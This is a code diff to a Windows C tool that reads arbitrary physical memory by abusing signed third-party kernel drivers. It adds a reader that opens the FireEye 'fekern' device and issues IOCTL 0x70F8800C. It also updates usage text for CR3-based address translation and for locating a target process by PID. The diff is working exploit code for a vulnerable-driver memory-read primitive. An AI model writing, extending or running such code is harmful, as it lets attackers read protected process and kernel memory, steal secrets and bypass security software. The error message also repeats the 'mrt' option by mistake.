@@ -169,6 +169,20 @@ static int read_asrdrv(mb_phys_reader *r, uint64_t pa, void *buf, uint32_t size)
     return ok ? 1 : 0;
 }
 
+// ---- 取数层 provider: FireEye/fekern MRT (SYSTEM-only ACL) ----
+// MRT_IOCTL_READ_PHYSICALMEMORY 0x70F8800C: input 16B {u64 PA; u32 size; u32 flags};
+// output = size bytes (MmCopyMemory(..., MM_COPY_MEMORY_PHYSICAL)).
+static int read_mrt(mb_phys_reader *r, uint64_t pa, void *buf, uint32_t size) {
+    if (r->dev == INVALID_HANDLE_VALUE || !buf || !size) return 0;
+    uint8_t in[16];
+    DWORD ret = 0;
+    memset(in, 0, sizeof(in));
+    *(uint64_t *)(in + 0) = pa;
+    *(uint32_t *)(in + 8) = size;
+    *(uint32_t *)(in + 12) = 0;
+    return DeviceIoControl(r->dev, 0x70F8800Cu, in, sizeof(in), buf, size, &ret, NULL) ? 1 : 0;
+}
+
 static int reader_open(mb_phys_reader *r, const char *kind, const char *device) {
     memset(r, 0, sizeof(*r));
     r->dev = INVALID_HANDLE_VALUE;
@@ -207,8 +221,15 @@ static int reader_open(mb_phys_reader *r, const char *kind, const char *device) 
             r->dev = CreateFileA(names[i], GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE,
                                  NULL, OPEN_EXISTING, 0, NULL);
         }
+    } else if (_stricmp(kind, "mrt") == 0) {
+        r->name = "mrt";
+        r->mode = 5;
+        r->read = read_mrt;
+        r->dev = CreateFileA(device ? device : "\\\\.\\fekern_00",
+                             GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE,
+                             NULL, OPEN_EXISTING, 0, NULL);
     } else {
-        fprintf(stderr, "[ERR] unknown reader '%s' (mock|cchwapi|rtkio|eneio64|asrdrv)\n", kind ? kind : "");
+        fprintf(stderr, "[ERR] unknown reader '%s' (mock|cchwapi|rtkio|eneio64|asrdrv|mrt|mrt)\n", kind ? kind : "");
         return 0;
     }
     if (r->dev == INVALID_HANDLE_VALUE) {
@@ -504,10 +525,10 @@ static void usage(void) {
     printf("Usage:\n");
     printf("  layers --selftest-mock\n");
     printf("  layers --ranges                       (read physical RAM ranges from registry)\n");
-    printf("  layers --reader <cchwapi|rtkio|eneio64|asrdrv> [--device <path>] --read-phys --pa <hex> --size <n>\n");
-    printf("  layers --reader <cchwapi|rtkio|eneio64|asrdrv> [--device <path>] --cr3 <hex> --va <hex> --size <n>\n");
-    printf("  layers --reader <cchwapi|rtkio|eneio64|asrdrv> [--device <path>] --locate --pid <pid> --scan-start <hex> --scan-size <hex> [--name <exe>]\n");
-    printf("  layers --reader <cchwapi|rtkio|eneio64|asrdrv> [--device <path>] --locate --pid <pid> --auto-ranges [--name <exe>]\n");
+    printf("  layers --reader <cchwapi|rtkio|eneio64|asrdrv|mrt> [--device <path>] --read-phys --pa <hex> --size <n>\n");
+    printf("  layers --reader <cchwapi|rtkio|eneio64|asrdrv|mrt> [--device <path>] --cr3 <hex> --va <hex> --size <n>\n");
+    printf("  layers --reader <cchwapi|rtkio|eneio64|asrdrv|mrt> [--device <path>] --locate --pid <pid> --scan-start <hex> --scan-size <hex> [--name <exe>]\n");
+    printf("  layers --reader <cchwapi|rtkio|eneio64|asrdrv|mrt> [--device <path>] --locate --pid <pid> --auto-ranges [--name <exe>]\n");
     printf("  layers --reader ... --locate --pid <pid> (--scan-start/--scan-size | --auto-ranges) --va <hex> --size <n>\n");
 }
 
